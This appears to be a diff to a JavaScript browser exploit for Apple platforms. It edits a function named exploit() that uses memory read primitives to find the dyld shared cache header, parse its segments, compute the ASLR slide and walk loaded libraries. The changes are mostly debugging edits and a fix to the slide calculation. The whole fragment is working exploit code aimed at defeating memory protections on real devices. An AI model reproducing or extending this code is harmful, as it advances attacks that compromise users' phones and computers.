@@ -577,7 +577,7 @@ function exploit(){
         }
 
         alert('dyld cache header @' + hdr);
-        alert('magic' + hex2a(memory.u32(hdr)))
+        alert('magic' + memory.u32(hdr))
         var base_seg = null;
         var nsegs    = memory.u32(Add(hdr, 0x14));
         var segdata  = memory.read(Add(hdr, memory.u32(Add(hdr, 0x10))), nsegs * 0x20);
@@ -620,10 +620,10 @@ function exploit(){
             if(seg.initprot & VM_PROT_EXECUTE){
                 init_rights += "x";
             }
-            if(max_rights.length < 4){
+            if(max_rights.length < 3){
                 max_rights = "-" + max_rights;
             }
-            if(init_rights.length < 4){
+            if(init_rights.length < 3){
                 init_rights = "-" + init_rights;
             }
             log("DYLD Shared cache segment ("+seg.addr.toString(16)+"-"+Add(seg.addr, seg.size).toString(16)+"): "+init_rights+"/"+max_rights);
@@ -640,7 +640,7 @@ function exploit(){
         var cache_slide = Sub(hdr, base_seg.addr);
         for(var i = 0; i < segs.length; ++i)
         {
-            segs[i].addr = Add(segs[i].addr, cache_slide) + segs[i].size;
+            segs[i].addr = Add(segs[i].addr, cache_slide);
         }
         var libs =
         {
@@ -695,6 +695,7 @@ function exploit(){
             };
             var base = Add(memory.read_i64(Add(imgs, i * 0x20),0), cache_slide);
             alert("base" + base);
+            
             if(opcode_libs.some(lib => strcmp(fn, lib)))
             {
                 var ncmds = memory.u32(Add(base, 0x10));
